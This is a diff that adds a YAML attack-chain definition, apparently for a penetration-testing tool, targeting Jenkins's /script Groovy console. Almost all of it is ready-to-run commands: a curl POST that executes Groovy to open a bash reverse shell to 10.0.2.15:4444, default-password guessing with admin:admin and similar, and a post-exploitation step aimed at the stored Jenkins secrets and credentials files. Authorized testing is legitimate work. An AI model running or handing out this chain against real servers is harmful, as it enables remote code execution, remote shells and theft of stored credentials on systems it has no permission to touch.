@@ -1,0 +1,43 @@
+chain_id: jenkins_script_console
+title: "Jenkins — /script Groovy console to RCE"
+severity: CRITICAL
+tags: [jenkins, web, groovy, rce]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)jenkins" }
+    - { path_pattern: "(?i)/(script|jenkins/script)$" }
+
+description: |
+  Jenkins exposes a Groovy script console at /script. With admin (or
+  Overall/Administer) access, it executes arbitrary Groovy as the
+  Jenkins service account — RCE on the controller and every connected
+  agent that the controller can dispatch jobs to.
+
+steps:
+  - id: 1
+    title: "Confirm /script is reachable"
+    command: curl -s -o /dev/null -w '%{http_code}\n' http://$VICTIMA:8080/script
+
+  - id: 2
+    title: "Drop a reverse shell via Groovy"
+    command: |
+      curl -X POST 'http://$VICTIMA:8080/script' \
+        --data-urlencode 'script=Runtime.getRuntime().exec(["bash","-c","bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"] as String[])'
+
+  - id: 3
+    title: "If credentials are required, try classic defaults first"
+    command: |
+      curl -u admin:admin http://$VICTIMA:8080/script
+      curl -u jenkins:jenkins http://$VICTIMA:8080/script
+      curl -u admin:Password1 http://$VICTIMA:8080/script
+
+  - id: 4
+    title: "Pull stored Jenkins credentials (post-exploit)"
+    command: |
+      # In the Groovy console, after dropping the shell:
+      println(hudson.util.Secret.fromString('SECRET_VALUE').getEncryptedValue())
+      # Master.key + credentials.xml + secrets/ are under $JENKINS_HOME.
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jenkins
